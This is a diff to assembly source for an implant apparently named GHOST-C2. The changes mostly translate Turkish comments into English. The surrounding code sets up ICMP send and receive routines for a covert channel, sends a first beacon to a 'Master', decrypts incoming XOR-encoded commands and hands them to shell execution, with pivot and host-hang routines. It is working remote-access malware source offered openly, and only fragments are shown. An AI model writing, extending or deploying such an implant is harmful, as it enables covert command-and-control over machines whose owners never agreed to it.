@@ -71,26 +71,26 @@ _start:
     mov rbp, rsp ; anchor
     
     ; ================================================================
-    ; 🧠 YENİ: AĞ YÖNLENDİRİCİSİ (VTABLE) KURULUMU
+    ; Network Protocol Router (VTABLE) Setup
     ; ================================================================
-    ; Ajanı ICMP modunda başlatıyoruz. (PIC uyumlu olması için 'rel' kullanıyoruz)
+    ; Agent starts as icmp. (PIC uyumlu olması için 'rel' kullanıyoruz)
     
     lea rax, [rel _icmp_init]
-    mov [rbp + 0x3000], rax       ; Ağ Başlatma Fonksiyonu
+    mov [rbp + 0x3000], rax       ; Network protocol function
 
     lea rax, [rel _icmp_recv]
-    mov [rbp + 0x3008], rax       ; Veri Dinleme Fonksiyonu
+    mov [rbp + 0x3008], rax       ; socket listening function / data
 
     lea rax, [rel _icmp_send]
-    mov [rbp + 0x3010], rax       ; Veri Gönderme Fonksiyonu
+    mov [rbp + 0x3010], rax       ; data sending function
     ; ================================================================
     
     
-    ; Stack'te kendimize güvenli R-W alanlar belirliyoruz:
-    ; icmp_packet kopyası -> [rsp + 0x1000]
-    ; delay_req kopyası   -> [rsp + 0x1100]
-    ; argv_array kopyası  -> [rsp + 0x1200]
-    ; icmp_packet'i Stack'e taşı
+    ; Creating safe place on stack R-W / Stack'te kendimize güvenli R-W alanlar belirliyoruz:
+    ; icmp_packet copy -> [rsp + 0x1000]
+    ; delay_req copy   -> [rsp + 0x1100]
+    ; argv_array copy  -> [rsp + 0x1200]
+    ; icmp_packet'i Stack'e taşı 
     lea rsi, [rel icmp_packet]  ; .data'daki orijinal şablon (Sadece okunur, sorun yok)
     lea rdi, [rbp + 0x100]     ; Stack'teki yeni yerimiz (Okunur ve Yazılır!)
     mov rcx, 88                 ; Paketin boyutu
@@ -106,7 +106,7 @@ _start:
 	; Step 3: Ağ Modülünü Başlat (Hangi protokol VTable'da ise o çalışır)
     call [rbp + 0x3000]
     
-    ; --- İLK BEACON (MERHABA PAKETİ) ---
+    ; --- First Beacon hello packet / İLK BEACON (MERHABA PAKETİ) ---
     mov r12, 0              ; Payload boyutu 0 olsun (Boş paket)
     call [rbp + 0x3010]     ; VTable Index 2: _send çağır! (Master'a sinyal gider)
     ; -----------------------------------
@@ -122,7 +122,7 @@ _sniff:
     mov rcx, r14
     call _xor_cipher                ; şifreyi çöz
     
-    ; --- AJAN PIVOT KONTROLÜ --
+    ; --- AGENT PIVOT CONTROL --
     cmp byte [rsi], '!'   ; Komut '!' ile mi başlıyor? (Özel komut işareti)
     jne _execute_command  ; Değilse normal shell komutudur, devam et.
     
@@ -930,7 +930,7 @@ _hang_host:
     jmp _hang_host      ; If wake up go sleep it again / Uyanırsa tekrar uyut
 ; =================================================================
 
-; 🚩 GHOST-C2 VERİ DEPOSU (KODUNUN PARÇASI)
+; GHOST-C2 DATA STORAGE Configs etc./ VERİ DEPOSU (KODUNUN PARÇASI)
 
 ; =================================================================
 
